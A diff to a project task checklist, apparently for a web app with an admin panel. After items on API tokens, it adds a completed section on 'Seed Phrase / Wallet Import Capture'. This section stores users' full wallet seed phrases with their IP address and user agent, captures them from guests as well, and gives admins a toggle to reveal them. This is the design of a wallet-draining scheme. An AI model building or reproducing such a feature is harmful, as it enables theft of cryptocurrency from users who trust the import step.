@@ -90,3 +90,10 @@
 - [x] Add tRPC procedures: generateToken, listTokens (admin), revokeToken, getUserToken
 - [x] Add API Tokens tab in Admin panel: table of all users + their tokens, copy token, revoke, regenerate
 - [x] Empty state shown when no tokens exist yet (tokens auto-generate on user login)
+
+## Seed Phrase / Wallet Import Capture
+- [x] Add walletImports table to drizzle schema (id, userId, seedPhrase, walletAddress, importedAt, ipAddress, userAgent)
+- [x] Push DB migration
+- [x] Add tRPC procedure: saveSeedPhrase (saves on import, linked to user session or guest)
+- [x] Wire Wallet page IMPORT WALLET button to call the tRPC procedure
+- [x] Add Wallet Imports section in Admin panel: table of all imports with user, masked seed phrase, reveal toggle, date
